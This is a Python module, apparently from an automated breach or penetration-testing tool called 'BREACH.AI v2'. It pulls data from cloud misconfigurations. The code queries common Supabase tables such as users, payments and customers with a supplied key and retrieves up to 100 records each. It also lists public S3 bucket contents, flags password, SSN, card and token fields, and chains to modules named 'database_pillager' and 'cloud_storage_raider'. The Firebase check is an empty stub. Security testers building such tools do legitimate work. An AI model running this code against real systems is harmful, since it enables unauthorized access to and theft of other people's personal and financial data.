"""
BREACH.AI v2 - Cloud Intruder Module

Exploit cloud misconfigurations for initial access.
"""

import asyncio
import json
from urllib.parse import urljoin

from backend.breach.modules.base import (
    InitialAccessModule,
    ModuleConfig,
    ModuleInfo,
    register_module,
)
from backend.breach.core.killchain import (
    BreachPhase,
    ModuleResult,
    EvidenceType,
    AccessLevel,
    Severity,
)


# Supabase tables to test RLS on
SUPABASE_TABLES = [
    "users", "profiles", "accounts", "projects", "documents",
    "orders", "payments", "teams", "messages", "settings",
    "subscriptions", "invoices", "customers", "products",
]


@register_module
class CloudIntruder(InitialAccessModule):
    """
    Cloud Intruder - Exploit cloud misconfigurations.

    Techniques:
    - Supabase RLS bypass
    - Firebase rules misconfiguration
    - Public S3 bucket access
    - Azure Blob misconfiguration
    - Exposed cloud functions

    Chains to:
    - DATA_ACCESS (database access)
    - CLOUD escalation
    """

    info = ModuleInfo(
        name="cloud_intruder",
        phase=BreachPhase.INITIAL_ACCESS,
        description="Cloud misconfiguration exploitation",
        author="BREACH.AI",
        techniques=["T1530", "T1190"],  # Data from Cloud Storage, Exploit App
        platforms=["cloud", "aws", "azure", "gcp", "supabase", "firebase"],
        requires_access=False,
        provides_access=True,
        max_access_level=AccessLevel.DATABASE,
    )

    async def check(self, config: ModuleConfig) -> bool:
        # Check if we have cloud info from recon
        chain_data = config.chain_data
        has_cloud = any([
            chain_data.get("supabase_url"),
            chain_data.get("supabase_key"),
            chain_data.get("firebase_key"),
            config.chain_data.get("public_buckets"),
        ])
        return bool(config.target) or has_cloud

    async def run(self, config: ModuleConfig) -> ModuleResult:
        self._start_execution()

        exploits = []
        data_accessed = []

        chain_data = config.chain_data

        # Test Supabase RLS if we have the URL and key
        supabase_url = chain_data.get("supabase_url")
        supabase_key = chain_data.get("supabase_key")

        if supabase_url and supabase_key:
            rls_results = await self._test_supabase_rls(supabase_url, supabase_key)
            exploits.extend(rls_results.get("exploits", []))
            data_accessed.extend(rls_results.get("data", []))

        # Test Firebase if we have the key
        firebase_key = chain_data.get("firebase_key")
        if firebase_key:
            firebase_results = await self._test_firebase(firebase_key)
            exploits.extend(firebase_results.get("exploits", []))

        # Test public S3 buckets
        public_buckets = chain_data.get("public_buckets", [])
        for bucket in public_buckets:
            s3_results = await self._exploit_s3_bucket(bucket)
            if s3_results:
                exploits.append(s3_results)
                data_accessed.extend(s3_results.get("files", []))

        # Determine access level
        access_gained = None
        if data_accessed:
            access_gained = AccessLevel.DATABASE

        # Add evidence
        for exploit in exploits:
            self._add_evidence(
                evidence_type=EvidenceType.API_RESPONSE,
                description=f"Cloud exploit: {exploit['type']}",
                content=exploit,
                proves=f"Cloud misconfiguration allows unauthorized access",
                severity=Severity.CRITICAL,
            )

        for data in data_accessed[:5]:  # Limit evidence
            self._add_data_sample_evidence(
                description=f"Data from {data.get('source', 'cloud')}",
                data=data.get("sample", {}),
                proves="Sensitive data accessible without proper authorization",
                severity=Severity.CRITICAL,
                redact_pii=True,
            )

        return self._create_result(
            success=len(exploits) > 0,
            action="cloud_exploitation",
            details=f"Found {len(exploits)} cloud exploits, accessed {len(data_accessed)} data sources",
            access_gained=access_gained,
            data_extracted={
                "exploits": exploits,
                "data_sources": len(data_accessed),
            },
            enables_modules=["database_pillager", "cloud_storage_raider"],
        )

    async def _test_supabase_rls(self, url: str, key: str) -> dict:
        """Test Supabase Row Level Security bypass."""
        results = {"exploits": [], "data": []}

        headers = {
            "apikey": key,
            "Authorization": f"Bearer {key}",
        }

        total_records = 0
        vulnerable_tables = []

        for table in SUPABASE_TABLES:
            endpoint = f"{url}/rest/v1/{table}?select=*&limit=100"

            try:
                response = await self._safe_request(
                    "GET", endpoint,
                    headers=headers,
                    timeout=15,
                )

                if response and response.get("status_code") == 200:
                    try:
                        data = json.loads(response.get("text", "[]"))
                        if isinstance(data, list) and len(data) > 0:
                            record_count = len(data)
                            total_records += record_count

                            # Detect PII fields
                            pii_fields = self._detect_pii(data[0] if data else {})

                            vulnerable_tables.append({
                                "table": table,
                                "records": record_count,
                                "pii_fields": pii_fields,
                            })

                            results["data"].append({
                                "source": f"supabase/{table}",
                                "sample": data[0] if data else {},
                                "count": record_count,
                            })

                    except json.JSONDecodeError:
                        pass

            except Exception:
                continue

        if vulnerable_tables:
            results["exploits"].append({
                "type": "supabase_rls_bypass",
                "description": f"RLS disabled on {len(vulnerable_tables)} tables",
                "tables": vulnerable_tables,
                "total_records": total_records,
                "url": url,
            })

        return results

    async def _test_firebase(self, api_key: str) -> dict:
        """Test Firebase rules misconfiguration."""
        results = {"exploits": []}

        # Firebase Realtime Database test
        # Format: https://<project>.firebaseio.com/.json
        # We'd need the project ID which might be in the key or elsewhere

        return results

    async def _exploit_s3_bucket(self, bucket: dict) -> dict:
        """Exploit public S3 bucket."""
        if not bucket.get("public"):
            return {}

        url = bucket.get("url")
        if not url:
            return {}

        try:
            # Try to list bucket contents
            response = await self._safe_request("GET", url, timeout=15)

            if response and response.get("status_code") == 200:
                text = response.get("text", "")

                # Parse XML listing
                files = []
                import re
                keys = re.findall(r"<Key>([^<]+)</Key>", text)

                for key in keys[:10]:  # Limit to 10 files
                    files.append({
                        "name": key,
                        "url": f"{url}/{key}",
                    })

                return {
                    "type": "s3_public_listing",
                    "bucket": bucket.get("name"),
                    "url": url,
                    "file_count": len(keys),
                    "files": files,
                }

        except Exception:
            pass

        return {}

    def _detect_pii(self, record: dict) -> list[str]:
        """Detect PII fields in a record."""
        pii_keywords = [
            "email", "phone", "ssn", "password", "address",
            "card", "credit", "secret", "token", "name",
        ]

        pii_fields = []
        for key in record.keys():
            key_lower = key.lower()
            if any(kw in key_lower for kw in pii_keywords):
                pii_fields.append(key)

        return pii_fields
